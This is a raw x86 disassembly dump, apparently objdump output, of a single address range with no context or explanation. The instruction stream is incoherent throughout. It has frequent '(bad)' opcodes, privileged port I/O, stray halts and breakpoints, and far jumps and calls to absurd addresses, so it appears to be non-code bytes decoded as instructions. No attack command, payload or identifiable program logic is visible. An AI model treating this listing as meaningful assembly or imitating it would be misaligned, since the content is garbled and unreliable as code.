  411d2a:	add    DWORD PTR [edi-0x16e2a33],ebx
  411d30:	pop    edi
  411d31:	sub    bh,dl
  411d33:	ins    BYTE PTR es:[edi],dx
  411d34:	sbb    al,al
  411d36:	pop    ebx
  411d37:	mov    eax,ds:0x35670f60
  411d3c:	or     bl,BYTE PTR [ebx+0x20ade280]
  411d42:	or     al,0x3b
  411d44:	jne    0x411d3d
  411d46:	out    0xb6,al
  411d48:	push   ecx
  411d49:	mov    ah,0x21
  411d4b:	fsubr  DWORD PTR [eax+0x58]
  411d4e:	pop    ebp
  411d4f:	call   DWORD PTR [edx+ebp*4+0x7c59c44]
  411d56:	je     0x411ce2
  411d58:	icebp  
  411d59:	jno    0x411daa
  411d5b:	dec    eax
  411d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d5d:	es popa 
  411d5f:	pusha  
  411d60:	jmp    0xa53315ae
  411d65:	cmp    al,0x31
  411d67:	xchg   edx,eax
  411d68:	stc    
  411d69:	int3   
  411d6a:	int    0x45
  411d6c:	imul   edx,DWORD PTR [edx+0x44],0x47210678
  411d73:	xor    DWORD PTR [edi+0x3],ebp
  411d76:	mov    edx,0xe696c46a
  411d7b:	pop    ebp
  411d7c:	mov    dl,0x5f
  411d7e:	cmp    eax,0x73a961c2
  411d83:	scas   al,BYTE PTR es:[edi]
  411d84:	stos   BYTE PTR es:[edi],al
  411d85:	daa    
  411d86:	jmp    0x33c1102a
  411d8b:	dec    ebp
  411d8c:	xchg   edx,eax
  411d8d:	div    bh
  411d8f:	push   es
  411d90:	xor    dl,BYTE PTR [eax+esi*8-0xb9293a7]
  411d97:	cmp    DWORD PTR [esi-0x36f528a5],0xa89ed114
  411da1:	mov    bl,0x8d
  411da3:	dec    ebx
  411da4:	push   ebp
  411da5:	push   ebx
  411da6:	add    DWORD PTR [esi],0x80e0a70e
  411dac:	fstp   DWORD PTR [ecx+0x187a1912]
  411db2:	(bad)  
  411db3:	pop    ds
  411db4:	sub    bl,BYTE PTR [ebx+eiz*4-0x56d96c83]
  411dbb:	push   eax
  411dbc:	mov    esp,DWORD PTR [ecx+edi*8+0x566759a0]
  411dc3:	outs   dx,BYTE PTR ds:[esi]
  411dc4:	dec    edx
  411dc5:	and    BYTE PTR [ebp-0x6c],ch
  411dc8:	pop    es
  411dc9:	pop    ss
  411dca:	inc    esp
  411dcb:	inc    edx
  411dcc:	pop    eax
  411dcd:	mov    ebp,0x3b92850e
  411dd2:	xchg   ecx,eax
  411dd3:	xchg   DWORD PTR [edx+0x3a],edx
  411dd6:	ds jecxz 0x411df9
  411dd9:	das    
  411dda:	outs   dx,DWORD PTR ds:[esi]
  411ddb:	adc    al,0x72
  411ddd:	je     0x411dfc
  411ddf:	mov    ch,0x98
  411de1:	mov    eax,ds:0xb35e2103
  411de6:	test   al,0xa0
  411de8:	add    BYTE PTR [esi-0x26c3e4ef],0xa8
  411def:	repz push esi
  411df1:	inc    esp
  411df2:	push   es
  411df3:	cmp    BYTE PTR [ecx+0x4eb027c4],ch
  411df9:	call   DWORD PTR [ebx]
  411dfb:	leave  
  411dfc:	jmp    0x411db4
  411dfe:	fdiv   QWORD PTR [ebx-0x7cc51c74]
  411e04:	std    
  411e05:	mov    ecx,0xb0b7fd00
  411e0a:	std    
  411e0b:	shl    DWORD PTR [esi],1
  411e0d:	mov    dh,0x9a
  411e0f:	push   0x9f3fb8a
  411e14:	xor    ecx,0xffffffb7
  411e17:	pop    ss
  411e18:	push   eax
  411e19:	inc    edi
  411e1a:	sbb    bh,BYTE PTR [ecx]
  411e1c:	ins    BYTE PTR es:[edi],dx
  411e1d:	xchg   DWORD PTR [esi+0x32cee92f],esp
  411e23:	jbe    0x411de9
  411e25:	rcl    DWORD PTR [eax],cl
  411e27:	repz mov cl,0x49
  411e2a:	inc    edx
  411e2b:	inc    ecx
  411e2c:	cmp    edx,DWORD PTR ds:0x3f91e6c
  411e32:	imul   ebx,DWORD PTR ds:0xaa6cee01,0x564fc2bb
  411e3c:	xchg   ebx,eax
  411e3d:	sub    eax,0x737b5f73
  411e42:	loop   0x411e8a
  411e44:	sbb    dh,dh
  411e46:	loop   0x411ec0
  411e48:	mov    dh,0xfb
  411e4a:	xlat   BYTE PTR ds:[ebx]
  411e4b:	clc    
  411e4c:	adc    DWORD PTR ds:0x35c839d4,edx
  411e52:	xchg   DWORD PTR [edi+edx*4-0x16],esi
  411e56:	lods   al,BYTE PTR ds:[esi]
  411e57:	sbb    al,0x79
  411e59:	mov    eax,ds:0x273759a2
  411e5e:	popa   
  411e5f:	jo     0x411ebf
  411e61:	pop    es
  411e62:	ss mov edx,0xb0cbbfe0
  411e68:	pop    ds
  411e69:	sub    DWORD PTR [esi+0x3f],esp
  411e6c:	jae    0x411e9e
  411e6e:	hlt    
  411e6f:	hlt    
  411e70:	adc    eax,0x9372536e
  411e75:	xchg   ecx,eax
  411e76:	cmp    al,BYTE PTR [ecx]
  411e78:	sub    dh,ch
  411e7a:	mov    bl,0xf0
  411e7c:	dec    ecx
  411e7d:	pushf  
  411e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e7f:	enter  0x4fb1,0x9
  411e83:	inc    ebp
  411e84:	inc    ebx
  411e85:	and    cl,BYTE PTR [edx-0x7]
  411e88:	je     0x411eac
  411e8a:	outs   dx,BYTE PTR ds:[esi]
  411e8b:	push   ss
  411e8c:	sahf   
  411e8d:	shl    BYTE PTR [esi+eax*1],cl
  411e90:	ins    DWORD PTR es:[edi],dx
  411e91:	or     edx,ebx
  411e93:	and    BYTE PTR [ebp+0x49c631e6],dh
  411e99:	jp     0x411eab
  411e9b:	dec    edi
  411e9c:	repz mov ds:0x3ee09f11,al
  411ea2:	pop    es
  411ea3:	sbb    dh,BYTE PTR [ecx]
  411ea5:	dec    eax
  411ea6:	push   edx
  411ea7:	cmp    cl,ah
  411ea9:	fnsave [edx-0x52]
  411eac:	(bad)  
  411ead:	out    dx,al
  411eae:	mov    dl,0x81
  411eb0:	inc    edx
  411eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb2:	mov    cl,0xdd
  411eb4:	js     0x411ec6
  411eb6:	xchg   esp,eax
  411eb7:	jns    0x411ebf
  411eb9:	aaa    
  411eba:	pop    eax
  411ebb:	sub    DWORD PTR [edx+0x3d],esi
  411ebe:	mov    edx,0x92fdefa2
  411ec3:	xchg   ebp,eax
  411ec4:	push   edx
  411ec5:	jmp    0x411e51
  411ec7:	xchg   BYTE PTR [ecx-0x6d2dc964],ah
  411ecd:	repz sub al,0x7c
  411ed0:	cmp    al,BYTE PTR [ebx-0x187ad347]
  411ed6:	out    0xbc,eax
  411ed8:	xchg   ebx,eax
  411ed9:	ja     0x411ee2
  411edb:	sbb    al,0xeb
  411edd:	fidiv  DWORD PTR [edx+0x52525eef]
  411ee3:	retf   
  411ee4:	add    eax,0xaaaefd9
  411ee9:	mov    ebx,0xa32aa702
  411eee:	div    bh
  411ef0:	jl     0x411eb5
  411ef2:	sub    al,0x16
  411ef4:	adc    al,0x6c
  411ef6:	loopne 0x411f73
  411ef8:	popf   
  411ef9:	dec    eax
  411efa:	pop    esp
  411efb:	pushf  
  411efc:	or     al,BYTE PTR [ebx+0x66fb6716]
  411f02:	add    BYTE PTR [ebp+0x57],cl
  411f05:	(bad)  
  411f06:	cmp    BYTE PTR [ecx+0x1c],cl
  411f09:	sbb    eax,edi
  411f0b:	sub    eax,0xc90b5e4
  411f10:	and    ebp,0x54
  411f13:	push   ecx
  411f14:	test   BYTE PTR [eax+edi*4+0x19],bh
  411f18:	lods   eax,DWORD PTR ds:[esi]
  411f19:	add    dl,ah
  411f1b:	pop    eax
  411f1c:	sahf   
  411f1d:	rcr    al,cl
  411f1f:	rol    DWORD PTR [eax-0x6b],0x49
  411f23:	retf   0x5b2f
  411f26:	and    edx,DWORD PTR [edx+0xd]
  411f29:	inc    ecx
  411f2a:	fdivp  st(3),st
  411f2c:	sbb    BYTE PTR [ebp-0xa],ah
  411f2f:	cdq    
  411f30:	mov    ah,0x99
  411f32:	in     eax,dx
  411f33:	je     0x411fab
  411f35:	lods   al,BYTE PTR ds:[esi]
  411f36:	add    al,0x58
  411f38:	mov    al,0xe3
  411f3a:	mov    eax,ds:0x57ec3c04
  411f3f:	fcom   DWORD PTR [ecx-0x3c702804]
  411f45:	cmp    BYTE PTR [ecx-0x4a],al
  411f48:	sub    bl,0x2d
  411f4b:	dec    ebp
  411f4c:	xor    al,0x47
  411f4e:	and    DWORD PTR [ebx+0x3c],esi
  411f51:	pop    ss
  411f52:	(bad)  
  411f53:	in     eax,0xd1
  411f55:	repnz aad 0x1
  411f58:	cmp    edx,DWORD PTR [esi-0x25]
  411f5b:	mov    bl,0xc1
  411f5d:	icebp  
  411f5e:	inc    esp
  411f5f:	scas   eax,DWORD PTR es:[edi]
  411f60:	jge    0x411f2a
  411f62:	mov    ebx,0xbd1cfa24
  411f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f68:	hlt    
  411f69:	call   0xe871:0xac52b037
  411f70:	(bad)  
  411f71:	imul   edi,DWORD PTR ds:0x8ead38ea,0xfffffff8
  411f78:	fsubr  QWORD PTR [eax]
  411f7a:	mov    dl,0xe6
  411f7c:	push   esp
  411f7d:	jae    0x411f98
  411f7f:	cs dec ebx
  411f81:	push   edx
  411f82:	dec    edi
  411f83:	push   ecx
  411f84:	sub    bl,BYTE PTR [ebx]
  411f86:	inc    DWORD PTR [edi]
  411f88:	imul   eax,ecx,0x4bd7e0e0
  411f8e:	pop    ss
  411f8f:	cmp    al,0xab
  411f91:	and    esp,esp
  411f93:	xchg   ebp,eax
  411f94:	xchg   DWORD PTR [ebp-0x3ef4e001],esp
  411f9a:	push   ds
  411f9b:	add    ah,BYTE PTR [ecx+edx*1]
  411f9e:	lahf   
  411f9f:	jo     0x411f67
  411fa1:	add    BYTE PTR [esi],dh
  411fa3:	sbb    eax,0xed694d1f
  411fa8:	hlt    
  411fa9:	and    edi,DWORD PTR [eax]
  411fab:	fild   QWORD PTR [ebp-0x24]
  411fae:	sub    al,BYTE PTR [edi-0x4]
  411fb1:	fs in  eax,0xf5
  411fb4:	sub    al,0x68
  411fb6:	retf   
  411fb7:	push   ebx
  411fb8:	mov    dl,0x99
  411fba:	call   0xeeadb770
  411fbf:	mov    ?,edx
  411fc1:	cwde   
  411fc2:	int3   
  411fc3:	dec    edi
  411fc4:	stos   DWORD PTR es:[edi],eax
  411fc5:	mov    ds,esi
  411fc7:	ret    0x4d51
  411fca:	or     bh,BYTE PTR [ecx-0x4b]
  411fcd:	add    esi,0x67
  411fd0:	sbb    edi,ecx
  411fd2:	dec    esi
  411fd3:	fist   WORD PTR [ebp-0x40]
  411fd6:	call   0x5dcd:0x46d9bbb6
  411fdd:	add    eax,0xa5ae8ec7
  411fe2:	loop   0x411fbf
  411fe4:	stc    
  411fe5:	nop
  411fe6:	out    0x46,eax
  411fe8:	dec    edi
  411fe9:	in     eax,0x51
  411feb:	sbb    esi,DWORD PTR [ebx]
  411fed:	sub    eax,0x9bf5b4ff
  411ff2:	sti    
  411ff3:	pop    es
  411ff4:	pushf  
  411ff5:	enter  0xe208,0xe2
  411ff9:	xor    dl,BYTE PTR [esi]
  411ffb:	int3   
  411ffc:	add    eax,0x50374491
  412001:	push   ss
  412002:	sbb    eax,edi
  412004:	lea    edx,ds:[esi-0x13b8d390]
  41200b:	dec    eax
  41200c:	inc    edi
  41200d:	and    DWORD PTR [edx+0x7dd2f4e6],esi
  412013:	imul   edx,DWORD PTR [ecx],0xffffffa3
  412016:	pop    ss
  412017:	dec    ebp
  412018:	stos   DWORD PTR es:[edi],eax
  412019:	stc    
  41201a:	sub    eax,0xbf0df4c4
  41201f:	into   
  412020:	mov    edi,DWORD PTR [esi+0x39]
  412023:	push   ecx
  412024:	dec    edx
  412025:	mov    esp,0x74edd7a0
  41202a:	sahf   
  41202b:	test   ch,al
  41202d:	not    BYTE PTR [ecx-0x77]
  412030:	xchg   edx,eax
  412031:	jmp    0xfa33:0x42856743
  412038:	out    dx,eax
  412039:	pop    ebp
  41203a:	jno    0x412006
  41203c:	into   
  41203d:	pop    ss
  41203e:	xchg   ebp,eax
  41203f:	cmp    DWORD PTR [ebp-0x33f2ecfb],ecx
  412045:	je     0x411fce
  412047:	add    DWORD PTR [ecx],ecx
  412049:	stos   DWORD PTR es:[edi],eax
  41204a:	pop    esi
  41204b:	xchg   esi,eax
  41204c:	cld    
  41204d:	sub    al,0xf7
  41204f:	std    
  412050:	mov    eax,ds:0xcfc4dc63
  412055:	mov    edx,0x360b79a2
  41205a:	mov    eax,0x91fedcc2
  41205f:	jge    0x4120b7
  412061:	call   FWORD PTR [esi]
  412063:	mov    edi,0x4f26a3d3
  412068:	icebp  
  412069:	aam    0x92
  41206b:	cld    
  41206c:	mov    edi,0x2abf1db8
  412071:	ror    ah,0xf7
  412074:	imul   ebp,ebp,0xfffffff6
  412077:	es and eax,0xd3d57957
  41207d:	pop    eax
  41207e:	stos   DWORD PTR es:[edi],eax
  41207f:	mov    gs,WORD PTR [ecx+edx*4+0x46deb5db]
  412086:	fmul   DWORD PTR [edx+0x12]
  412089:	xor    esp,DWORD PTR [ecx+edi*4]
  41208c:	sbb    DWORD PTR [ebp+0x52],esi
  41208f:	ret    
  412090:	push   eax
  412091:	jb     0x4120ce
  412093:	mov    ds:0xe3beeafd,eax
  412098:	sbb    ecx,edi
  41209a:	push   eax
  41209b:	arpl   WORD PTR [ebp+ebp*4+0x623b88a1],dx
  4120a2:	push   esp
  4120a3:	in     al,dx
  4120a4:	push   esp
  4120a5:	jg     0x412088
  4120a7:	in     al,0x4a
  4120a9:	clc    
  4120aa:	aam    0x6
  4120ac:	fisub  DWORD PTR [edi-0x783a97a7]
  4120b2:	(bad)  
  4120b3:	nop
  4120b4:	inc    ecx
  4120b5:	dec    esp
  4120b6:	int    0x19
  4120b8:	test   DWORD PTR gs:[eax],edx
  4120bb:	cdq    
  4120bc:	lds    esp,FWORD PTR [ebx-0x26]
  4120bf:	sbb    dh,BYTE PTR [edx]
  4120c1:	bound  edx,QWORD PTR [ebx+ebx*2-0x56dacd09]
  4120c8:	iret   
  4120c9:	mov    eax,ds:0xec57c6
  4120ce:	mov    ah,0x14
  4120d0:	mov    al,0x92
  4120d2:	in     al,dx
  4120d3:	data16 mov al,ds:0x6a3461d4
  4120d9:	mov    ebx,0xf600a213
  4120de:	xchg   esi,eax
  4120df:	xchg   edi,ebp
  4120e1:	sbb    eax,0x70c9e920
  4120e6:	push   cs
  4120e7:	test   DWORD PTR [edi],esi
  4120e9:	or     BYTE PTR [esi-0x55],al
  4120ec:	out    dx,eax
  4120ed:	das    
  4120ee:	aas    
  4120ef:	mov    BYTE PTR [esi],ch
  4120f1:	adc    al,0x99
  4120f3:	and    DWORD PTR [edx+0x7c],esp
  4120f6:	add    BYTE PTR [edx+0x7d],ah
  4120f9:	xor    ebp,DWORD PTR [edi]
  4120fb:	mov    ah,0xcb
  4120fd:	pop    esp
  4120fe:	nop
  4120ff:	fisttp DWORD PTR [esi+0x41340149]
  412105:	call   0xe5e43863
  41210a:	out    dx,al
  41210b:	cdq    
  41210c:	add    eax,0xb58a017d
  412111:	adc    ecx,eax
  412113:	or     esi,ebx
  412115:	mov    esi,0x9e2370d1
  41211a:	ja     0x412180
  41211c:	test   al,0x11
  41211e:	add    al,0xc3
  412120:	iret   
  412121:	and    DWORD PTR [esp+ebp*8-0x8],ebp
  412125:	inc    eax
  412126:	enter  0x8898,0x2d
  41212a:	push   cs
  41212b:	cmp    BYTE PTR [esi+0x2],0x5f
  41212f:	and    al,0x31
  412131:	les    esp,FWORD PTR [edx+0x6902e400]
  412137:	scas   al,BYTE PTR es:[edi]
  412138:	stos   BYTE PTR es:[edi],al
  412139:	push   0x79
  41213b:	jle    0x41215f
  41213d:	sbb    eax,DWORD PTR [esi-0x2c]
  412140:	scas   eax,DWORD PTR es:[edi]
  412141:	int    0xac
  412143:	mov    esi,0xe6a87a54
  412148:	or     BYTE PTR [eax+0x1b],al
  41214b:	xor    eax,0xbe3ac838
  412150:	(bad)  
  412151:	jmp    0x9a55410a
  412156:	push   cs
  412157:	fsubr  DWORD PTR [eax]
  412159:	add    esi,DWORD PTR [ebp+0x1aed379f]
  41215f:	cmp    al,BYTE PTR [ebp-0x7f]
  412162:	dec    esi
  412163:	fdivrp st(4),st
  412165:	mov    ds:0xb4bd3dd4,eax
  41216a:	out    dx,eax
  41216b:	inc    ebp
  41216c:	jmp    0x412117
  41216e:	pop    esi
  41216f:	jl     0x41212b
  412171:	pusha  
  412172:	xchg   ebx,eax
  412173:	(bad)  
  412174:	out    0xac,al
  412176:	ins    DWORD PTR es:[edi],dx
  412177:	aam    0xf0
  412179:	loope  0x412126
  41217b:	iret   
  41217c:	(bad)
  412181:	add    esp,ecx
  412183:	inc    ebp
  412184:	rcr    BYTE PTR [edi+0xf4c4aef],0x58
  41218b:	and    eax,0x7529a9ea
  412190:	and    al,0x24
  412192:	push   ebp
  412193:	adc    DWORD PTR [ebx-0x114a3e43],esi
  412199:	or     al,0x6a
  41219b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41219c:	stos   DWORD PTR es:[edi],eax
  41219d:	test   BYTE PTR [esi+0x17],dh
  4121a0:	out    0xcf,al
  4121a2:	addr16 xchg DWORD PTR [bp+si+0x40],eax
  4121a7:	xor    eax,0x721a6d3
  4121ac:	out    0x84,eax
  4121ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121af:	jp     0x41221d
  4121b1:	xlat   BYTE PTR ds:[ebx]
  4121b2:	mov    esi,DWORD PTR [edx+0x1e]
  4121b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121b6:	loop   0x412180
  4121b8:	pop    ecx
  4121b9:	rcr    DWORD PTR [esi-0x27],cl
  4121bc:	cmc    
  4121bd:	sti    
  4121be:	(bad)
  4121c1:	lahf   
  4121c2:	dec    edi
  4121c3:	push   es
  4121c4:	hlt    
  4121c5:	(bad)  
  4121c7:	adc    edx,DWORD PTR [ebx+0x8]
  4121ca:	dec    esp
  4121cb:	and    BYTE PTR [ecx+0x3e2cd70a],bl
  4121d1:	test   DWORD PTR [eax+esi*8-0x38],ebp
  4121d5:	cwde   
  4121d6:	xor    esi,edi
  4121d8:	sbb    eax,0x41b40e8a
  4121dd:	jne    0x412259
  4121df:	sahf   
  4121e0:	fxch   st(5)
  4121e2:	jno    0x412245
  4121e4:	cld    
  4121e5:	das    
  4121e6:	mov    BYTE PTR [eax],al
  4121e8:	(bad)  [eax-0x378ee1bd]
  4121ee:	jnp    0x412251
  4121f0:	jnp    0x4121c2
  4121f2:	iret   
  4121f3:	scas   al,BYTE PTR es:[edi]
  4121f4:	cmp    DWORD PTR [edx+0x34cc62bc],ebp
  4121fa:	retf   0x8a74
  4121fd:	dec    ecx
  4121fe:	add    ebp,DWORD PTR [ebp+ecx*8-0x3a]
  412202:	sub    al,BYTE PTR [esi]
  412204:	lea    ebx,[ecx]
  412206:	scas   al,BYTE PTR es:[edi]
  412207:	xchg   esi,eax
  412208:	mov    bl,0x34
  41220a:	cmp    DWORD PTR [esi],ebx
  41220c:	inc    edi
  41220d:	sub    BYTE PTR [ecx-0x34],ch
  412210:	push   cs
  412211:	fimul  WORD PTR [edx+0x2f55411c]
  412217:	inc    edx
  412218:	js     0x4121bb
  41221a:	fucomip st,st(7)
  41221c:	retf   
  41221d:	ds cli 
  41221f:	daa    
  412220:	imul   ebp,DWORD PTR [edx],0xffffff85
  412223:	pop    esi
  412224:	lock mov es,WORD PTR [ecx+0x75eb34b6]
  41222b:	jae    0x4121c5
  41222d:	mov    DWORD PTR [ebx+eiz*8-0x3eb8c8a7],ecx
  412234:	scas   eax,DWORD PTR es:[edi]
  412235:	sub    edi,DWORD PTR [edi+0x4fc09b1b]
  41223b:	(bad)  
  41223c:	jl     0x412232
  41223e:	ins    DWORD PTR es:[edi],dx
  41223f:	or     dh,dh
  412241:	jne    0x41222a
  412243:	sbb    ch,BYTE PTR [eax+0x52]
  412246:	lods   al,BYTE PTR ds:[esi]
  412247:	jbe    0x412296
  412249:	sbb    eax,ebx
  41224b:	ja     0x412254
  41224d:	js     0x4121e0
  41224f:	out    dx,eax
  412250:	push   ecx
  412251:	dec    ebp
  412252:	push   es
  412253:	ror    BYTE PTR [ebp*8+0x6c865050],cl
  41225a:	imul   esp,DWORD PTR [edi+0x61],0xaf0c79c2
  412261:	xchg   ebp,eax
  412262:	xchg   ebx,eax
  412263:	add    DWORD PTR [esi],esp
  412265:	scas   al,BYTE PTR es:[edi]
  412266:	sbb    BYTE PTR [ebx+0x3a],ah
  412269:	xchg   esp,eax
  41226a:	jb     0x412280
  41226c:	add    BYTE PTR [eax-0x1a],al
  41226f:	xchg   ebp,eax
  412270:	jo     0x4122ac
  412272:	xor    BYTE PTR [edi+0x2502d1ee],al
  412278:	dec    ebx
  412279:	dec    esp
  41227a:	xchg   ecx,eax
  41227b:	adc    BYTE PTR [edi],0x48
  41227e:	xlat   BYTE PTR ds:[ebx]
  41227f:	adc    ah,dl
  412281:	in     eax,0xb1
  412283:	call   0x56b7d0e7
  412288:	ja     0x41226d
  41228a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41228b:	cmp    eax,0xea82d60b
  412290:	shl    DWORD PTR [edi+ecx*8-0x7f522eb4],cl
  412297:	iret   
  412298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412299:	xor    esi,DWORD PTR [edx-0x12]
  41229c:	inc    ebx
  41229d:	mov    ds:0xb07fc4af,eax
  4122a2:	ds mov ch,0x8c
  4122a5:	or     BYTE PTR [ebx-0x10d46310],0xb8
  4122ac:	and    al,0xd6
  4122ae:	cwde   
  4122af:	add    edx,0x1a1b0bdb
  4122b5:	enter  0x6ba9,0x8c
  4122b9:	jo     0x412263
  4122bb:	popf   
  4122bc:	stos   DWORD PTR es:[edi],eax
  4122bd:	mov    eax,0xf6b34026
  4122c2:	mov    ds:0x4e1e2cbb,eax
  4122c7:	jg     0x4122a4
  4122c9:	mov    al,0xde
  4122cb:	lds    esp,FWORD PTR [edx-0x48]
  4122ce:	nop
  4122cf:	jb     0x4122db
  4122d1:	push   0x5d
  4122d3:	lods   eax,DWORD PTR ds:[esi]
  4122d4:	scas   al,BYTE PTR es:[edi]
  4122d5:	enter  0xceba,0xda
  4122d9:	les    ebp,FWORD PTR [edx+eiz*8]
  4122dc:	cli    
  4122dd:	(bad)  
  4122de:	jg     0x4122ba
  4122e0:	gs pop ds
  4122e2:	mov    esp,0xaaf5236b
  4122e7:	sti    
  4122e8:	push   DWORD PTR [esi+0x113564b7]
  4122ee:	frstor [ecx]
  4122f0:	loope  0x412365
  4122f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122f3:	cmovnp esp,DWORD PTR [ebx-0x249e6464]
  4122fa:	mov    edi,eax
  4122fc:	out    dx,al
  4122fd:	sub    BYTE PTR [edx-0xe],cl
  412300:	inc    esp
  412301:	sub    eax,0x94a0f8e5
  412306:	js     0x4122f7
  412308:	(bad)  
  412309:	sti    
  41230a:	push   esp
  41230b:	stc    
  41230c:	dec    eax
  41230d:	out    dx,al
  41230e:	fcom   DWORD PTR [edi]
  412310:	iret   
  412311:	dec    edx
  412312:	arpl   WORD PTR [ebx-0x70535873],dx
  412318:	fs fwait
  41231a:	adc    al,0x8
  41231c:	ret    0xb133
  41231f:	mov    dl,0x8c
  412321:	repnz fnstcw WORD PTR [ecx+0x21]
  412325:	mov    cl,0x8f
  412327:	xor    eax,0x7d82958b
  41232c:	aad    0x4f
  41232e:	xchg   esp,eax
  41232f:	mov    ds:0x33fd2b3c,al
  412334:	test   ch,ch
  412336:	mov    ds:0x5b6d8f31,al
  41233b:	inc    ebp
  41233c:	(bad)  
  41233d:	repnz (bad) 
  41233f:	in     eax,dx
  412340:	rcr    BYTE PTR [edi+0x71],0xf0
  412344:	inc    esi
  412345:	adc    al,0xb0
  412347:	xchg   edx,eax
  412348:	int3   
  412349:	adc    ah,0x48
  41234c:	mov    ch,0x66
  41234e:	in     al,dx
  41234f:	dec    ecx
  412350:	mov    ds:0xbe6a75bd,al
  412355:	outs   dx,BYTE PTR ds:[esi]
  412356:	retf   0x330f
  412359:	sub    eax,0x647ec5b9
  41235e:	dec    eax
  41235f:	fstp   DWORD PTR gs:[ebx+0x38c2bbca]
  412366:	push   edx
  412367:	popf   
  412368:	xor    bl,BYTE PTR [ebp+0x2d5aeecd]
  41236e:	test   al,0x9b
  412370:	cdq    
  412371:	jbe    0x412317
  412373:	ins    DWORD PTR es:[edi],dx
  412374:	in     eax,0xb9
  412376:	cli    
  412377:	xor    dl,al
  412379:	xlat   BYTE PTR ds:[ebx]
  41237a:	es jnp 0x412324
  41237d:	retf   
  41237e:	mov    edx,ebp
  412380:	aaa    
  412381:	inc    edx
  412382:	fsub   QWORD PTR [esp+ecx*1+0x5449b0e3]
  412389:	pop    ebx
  41238a:	std    
  41238b:	sahf   
  41238c:	adc    bl,bl
  41238e:	loop   0x41233f
  412390:	cs sub al,0x93
  412393:	adc    DWORD PTR [esi],eax
  412395:	call   0xf600ca1d
  41239a:	jl     0x412357
  41239c:	sbb    al,0x3e
  41239e:	mov    edi,0x8c2ef296
  4123a3:	pop    esi
  4123a4:	dec    eax
  4123a5:	pop    esi
  4123a6:	push   edx
  4123a7:	aad    0xd5
  4123a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123aa:	jmp    0xea48950d
  4123af:	repz pop esp
  4123b1:	pop    ds
  4123b2:	inc    esp
  4123b3:	pop    ebx
  4123b4:	pusha  
  4123b5:	js     0x4123dd
  4123b7:	mov    ebx,0x6c78e984
  4123bc:	rcl    DWORD PTR [esi-0x6f],1
  4123bf:	mov    al,ds:0x55acc616
  4123c4:	lahf   
  4123c5:	jo     0x41239e
  4123c7:	shr    BYTE PTR ds:0x955e69a3,cl
  4123cd:	test   BYTE PTR [edi+0x11],dh
  4123d0:	and    DWORD PTR [esp+eax*8],0xffffffc5
  4123d4:	mov    ebp,edi
  4123d6:	jmp    0xe17cc000
  4123db:	jmp    0x41236b
  4123dd:	mov    BYTE PTR [di-0x39],dh
  4123e1:	icebp  
  4123e2:	xchg   ebp,eax
  4123e3:	sbb    edi,DWORD PTR [esi]
  4123e5:	sbb    edx,0x9cb5c010
  4123eb:	and    dl,bl
  4123ed:	xchg   BYTE PTR [esi+eax*8+0x21],dh
  4123f1:	xchg   edi,eax
  4123f2:	mov    bx,0x89b6
  4123f6:	xchg   esi,eax
  4123f7:	(bad)  
  4123f8:	bound  dx,DWORD PTR [esi-0x6b]
  4123fc:	(bad)  
  4123fd:	std    
  4123fe:	pop    eax
  4123ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412400:	xchg   edx,eax
  412401:	out    0xf9,al
  412403:	jae    0x412448
  412405:	mov    BYTE PTR [eax+0x48],0x7d
  412409:	loop   0x41238f
  41240b:	mov    edi,0x121a6a2
  412410:	add    edi,ecx
  412412:	adc    al,0x93
  412414:	jnp    0x41244c
  412416:	pop    ss
  412417:	adc    al,0x55
  412419:	(bad)  
  41241a:	pop    ebp
  41241b:	dec    ebp
  41241c:	adc    DWORD PTR [ebx+0x2d],edi
  41241f:	adc    DWORD PTR [esi+0x48],0xffffff96
  412423:	fwait
  412424:	mov    al,ds:0xf2f5597c
  412429:	dec    esi
  41242a:	xlat   BYTE PTR ds:[ebx]
  41242b:	dec    esi
  41242c:	sub    ah,BYTE PTR [edx]
  41242e:	sti    
  41242f:	dec    edx
  412431:	repz test eax,0x8e15d1d8
  412437:	dec    edi
  412438:	mov    ?,esi
  41243a:	je     0x412431
  41243c:	aad    0x25
  41243e:	aaa    
  41243f:	out    dx,eax
  412440:	xor    esp,DWORD PTR [eax]
  412442:	add    al,0xe9
  412444:	mov    eax,0xfa88d946
  412449:	pop    esp
  41244a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41244b:	dec    esp
  41244c:	cs jmp 0x55cb4816
  412452:	xchg   ecx,eax
  412453:	adc    dl,BYTE PTR [ebx]
  412455:	iret   
  412456:	mov    WORD PTR [edi+ebx*8],?
  412459:	push   cs
  41245a:	ja     0x4124c0
  41245c:	icebp  
  41245d:	or     DWORD PTR [ecx-0x2c],edi
  412460:	dec    esi
  412461:	push   edx
  412462:	jno    0x4123ef
  412464:	mov    cl,0xd3
  412466:	iret   
  412467:	add    al,0x30
  412469:	pop    es
  41246a:	push   ecx
  41246b:	mov    al,0xbb
  41246d:	push   0x6
  41246f:	sub    esi,edi
  412471:	lods   eax,DWORD PTR ds:[esi]
  412472:	scas   eax,DWORD PTR es:[edi]
  412473:	das    
  412474:	pop    ecx
  412475:	pop    eax
  412476:	ret    0xbd96
  412479:	stos   BYTE PTR es:[edi],al
  41247a:	add    BYTE PTR [ebx],bh
  41247c:	pop    ss
  41247d:	jno    0x41247c
  41247f:	out    0xa2,al
  412481:	cmp    al,0x5a
  412483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412484:	int    0x20
  412486:	call   0x9ea3:0xeadb456f
  41248d:	repnz gs inc eax
  412490:	dec    edi
  412491:	pop    ebp
  412492:	mov    cl,0xc7
  412494:	adc    DWORD PTR [edx-0x58],edx
  412497:	cmc    
  412498:	cmp    al,0x2d
  41249a:	and    bh,BYTE PTR [edi+0x3f933df4]
  4124a0:	sbb    DWORD PTR [ecx+0x6a],ecx
  4124a3:	aaa    
  4124a4:	mov    al,ds:0x3f36daa7
  4124a9:	sub    BYTE PTR [bx+si+0x7684],ah
